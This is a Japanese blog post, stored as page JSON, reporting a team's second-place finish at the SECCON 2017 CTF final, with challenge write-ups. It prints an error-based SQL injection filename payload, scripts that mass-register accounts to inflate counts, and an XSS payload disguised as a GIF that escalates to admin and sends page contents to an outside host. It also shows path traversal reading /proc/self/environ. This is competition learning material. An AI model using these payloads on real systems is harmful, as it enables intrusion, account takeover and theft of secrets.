{"pageProps":{"tag":"SECCON","entries":[{"type":"article","slug":"22","body":"**NaruseJun**というチームでSECCON決勝に出ました。\n\n# 決勝\n\nボクは予選に出られなかったんですが、枠を譲っていただいて憧れのSECCON決勝に出ることができました！\n\nhttps://twitter.com/_n_ari/status/964678908242157569\n\n# 結果\n\n競技開始後すぐAttackPointを稼ぎ、しばらくは首位を独走していましたがその後停滞。\n午後にDefencePointでジリジリを順位を上げ首位に返り咲いたものの、終了間際で追い抜かれ**2位(準優勝)**で終了しました。\n**文部科学大臣賞 個人賞**も頂きました。\n\nhttps://twitter.com/yamaha_sn/status/964784430572232705\n\nhttps://twitter.com/yamaha_sn/status/964787478178615302\n\nhttps://twitter.com/sekai67/status/964792274025529345\n\n# Writeup\n\n## 府中\n\nWeb問？\nElectronで書かれた音楽系SNSで、曲をアップロードできたりするようです。\n\n### Attack\n\nアップロードする際のファイル名もDBに記録しているようで、ここにSQLインジェクション脆弱性があります。\n\n```sql\n', 0, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 0, 1)) -- .wav\n```\n\nのようなファイルを投げると、MariaDBが型エラーを吐き、そのエラーメッセージで内容がわかります。\n\nいろいろ見ていたんですが、特に怪しいテーブルも存在せず、さらにDBにアクセスしているユーザが`file`テーブル以外へのアクセス権を持っていないように見えました。\n（挑戦していたのが終了間近で焦っていたので、違ったかもしれない……）\n\nで、結局ここから先がわかりませんでした……\nここからuserテーブルのis_adminフラグを立てるとか、adminのパスワードを抜くとかでしょうか？\nわかりません。\n\n### Defence\n\n再生数ランキング上位の曲名にディフェンスキーワードを入れられると、DefencePointがもらえます。\n\n1アカウント辺り、1再生しかカウントされないので、ランキングを上げるにはアカウントを量産することが必要です。\n適当にPOSTを投げるとアカウントが作れるので、さほど難しくないです。\n\n再生数のカウントは、ストリーミングサーバから実際に曲ファイルを取得した際に行われていて、\nストリーミングサーバへのリクエストはTCP上の独自プロトコル？っぽいもので通信しています。\nアプリが実際に使っているソースコードは、Electronパッケージから簡単に抜けるので、これを使うと簡単。\n\n#### 再生数を増やすNode.js向けスクリプト\n\n```js\nvar PromiseSocket = require('promise-socket');\n\nasync function getWAV(streaming_host, streaming_port, song, api_key) {\n    return new Promise(async (resolve, reject) => {\n        const socket = new PromiseSocket();\n        await socket.connect({\n            host: streaming_host,\n            port: streaming_port\n        });\n        for(let i = 0; i < 100; i++){\n            // '\\x80': select song\n            await socket.write(\"\\x80\");\n            await socket.write(song['unique_id']);\n            await socket.write(api_key);\n            // '\\x82': get WAV File Headers\n            await socket.write(\"\\x82\");\n            await socket.write(\"\\x84\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x7f\");\n            await socket.write(\"\\x81\");\n        }\n        // '\\x90': close connection\n        await socket.write(\"\\x90\");\n        // let result = (await socket.readAll());\n        let result = (await socket.end());\n        resolve(result);\n    });\n}\n\n\n(async _ => {\n    console.log(await getWAV(\"fuchu.koth.seccon\", 8000, {unique_id: process.argv[2]}, process.argv[3]));\n})();\n```\n\n#### アカウントを量産して再生数を稼ぐスクリプト\n\n```sh\nexport FLAG=\"176872aa9e14b27d972e2c56b1ec16db\"\nexport USERID=\"2099\"\nexport APIKEY=\"8be67707f019fe37fb4cf74e096b815ebcebfc7fc10790d19e8d71eb32482d49\"\nexport RESP=$(curl -X POST http://fuchu.koth.seccon/files -H \"X-FUCHU-KEY: $APIKEY\" -F \"file=@./po.wav;type=audio/wav\")\nexport UNIQID=$(echo $RESP | sed -E 's/[^:]+:\"([^,]+)\".+/\\1/')\nexport PAYLOAD=$(printf '{\"name\":\"%s\",\"unique_id\":\"%s\",\"artist\":%s,\"description\":\"hello\"}' $FLAG $UNIQID $USERID)\ncurl -X POST http://fuchu.koth.seccon/songs -H \"X-FUCHU-KEY: $APIKEY\" -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\nwhile true\ndo\n\texport USER=$(head /dev/urandom | md5)\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\",\"email\":\"%s@seccon.jp\",\"sex\":\"0\",\"birthday\":\"2018-02-15\",\"free_text\":\"\"}' $USER $USER)\n\tcurl -X POST http://fuchu.koth.seccon/users -H \"Content-Type: application/json\" --data \"$PAYLOAD\"\n\texport PAYLOAD=$(printf '{\"username\":\"%s\",\"password\":\"Hello I Am NaruseJun\"}' $USER)\n\texport RESP=$(curl -X POST http://fuchu.koth.seccon/auth -H \"Content-Type: application/json\" --data \"$PAYLOAD\")\n\texport APIKEY=$(echo $RESP | sed -E 's/.+\"(.+)\".+/\\1/')\n\tnode increment.js $UNIQID $APIKEY\ndone\n```\n\nこれらを用いると、ディフェンスキーワードをランキングに載せることができるので、\nチームメイトにお願いして書き込み続けてもらいました。\n\n## 船橋\n\n提示された指紋画像と一致するような、別の指紋画像を20個の候補の中から10秒以内に選択するような問題が10題出され、\nそのうちいくつかに正解できればAttackPointが手に入ります。5問以上を解くことができれば、DefencePointも手に入る様子。\n\n教師用データセットも与えられるので、機械学習するのが正攻法？\n他のチームの方に話を聞いたら、そもそも問題として出て来る画像のバリエーションが多くないので、力押しでなんとかなる……らしい。\n\nボクが目視でそれっぽい指紋を選んだら通りました。\n競技開始直後に説いているチームがちらほらいたので、気合で解けそうだなぁという気分がしていました。\n\n## 幕張\n\nスマートロックのアプリ(x86_64 ELF)を解析する問題。解けませんでした。\n\n後から聞いた話だと、MQTTでいろいろしていて、SubscribeするとFLAGが降ってくるとかこないとか？\nなんか外と通信しているんだろうなぁというのは分かったんですが、\nELFが動いて競技ネットワークと通信できるような環境を用意するのが難儀で、後回しにしていました。\n\n\n## 梅田\n\n画像投稿サイト。Web問。\n\n### Defence\n\nまず、ディフェンスキーワードは最もFav数の多いベージのコメント欄なので、\nもっともFav数の多いページにキーワードを書き込み続けるだけでした。\n\nどのページが最もFav数が多いかを追いかけるのが面倒そうだなぁと感じていたんですが、\nそもそもFav数を増やして対象ページをコロコロ変えるような戦略を取るチームがいなかったようで、\nそれほど頻繁には変わっていませんでした。\n登録時にしばしば429エラーが出ていたので、アカウント量産するのが難しかったのかな？\n\n```sh\nwhile true\ndo\n\texport CONTENT=44b106151c01d64e0c479eb43ef12a48\n\tcurl http://umeda.koth.seccon/photos/1 -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" > cache\n\texport NAME=$(cat cache | sed -E 's/.+\"csrf_name\" value=\"([^\"]+)\".+/\\1/')\n\texport VALUE=$(cat cache | sed -E 's/.+\"csrf_value\" value=\"([^\"]+)\".+/\\1/')\n\tcurl http://umeda.koth.seccon/photos/1/comment -X POST -H \"Cookie: PHPSESSID=5d7ef56d0cab6e12ec27e431c004e569\" -d csrf_name=$NAME -d csrf_value=$VALUE -d content=$CONTENT\ndone\n```\n\n### Attack\n\n1つ目のFLAGは、普通に`ID:1`の画像ページに書いてあった。\n\n不適切な画像(?)を管理者に報告するフォームでXSSができるようでした。\nただし、`Content-Security-Policy: script-src 'self'`ヘッダがついているので、\n画像アップロード機能を悪用して、同一オリジンに悪意のあるスクリプトを設置する必要があります。\n\nこんな感じに、`GIF8`がファイル先頭にあれば、画像ファイルかどうかのチェックをすり抜けられます。\n\n```js\nGIF8=8;\n\nfetch(\"/admin/users\", {credentials: 'include'})\n.then(r => r.text())\n.then(r => {\n\tconst [,v] = r.match(/name=\"csrf_value\" value=\"(.+?)\"/);\n\tconst [,n] = r.match(/name=\"csrf_name\" value=\"(.+?)\"/);\n\tconst body = `csrf_value=${v}&csrf_name=${n}&name=azon`;\n\treturn fetch(\"/admin/new-admin\", {\n\t\tbody,\n\t\tmethod: \"POST\",\n\t\theaders: {\n\t\t\t'Content-Type': 'application/x-www-form-urlencoded',\n\t\t},\n\t\tcredentials: 'include',\n\t});\n})\n.then(r => r.text())\n.then(r => fetch(\"http://192.168.14.4:8000/users\", {method: \"POST\", body: r}))\n```\n\n管理者のブラウザで適当に`/admin`ページを漁ると、\nどうやら任意のユーザを管理者に昇格する機能が存在することが分かるので、↑のコードで自分のアカウントを管理者にします。\n管理者でログインすると、2つ目と3つ目のFLAGがCookieに設定されていました。\n\nで、更に管理者ページを探すと`/admin/logs`というアプリのログを確認する機能が存在することがわかります。\nこのページの挙動をよく観察すると、単にログファイルのtailを表示しているだけで、\nさらにそのログファイルを指定するパラメータにパストラバーサル脆弱性があるようでした。\n\n管理者で`/admin/logs?p=/../../../../../../var/www/umeda/src/routes.php`としてソースの末尾を見ると、\n4つ目と5つ目のFLAGは環境変数に書き込まれていることが分かります。\nちなみに、ソースコードの所在は、変なパラメータを投げた時に帰ってくるエラーメッセージを読むとわかります。\n\n環境変数は`/admin/logs?p=/../../../../../../proc/self/environ`で読めます。\n","title":"SECCON2017国内決勝大会に出ました","image":null,"tags":["CTF","SECCON","参加記"],"date":"2018-02-20T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"}]},"__N_SSG":true}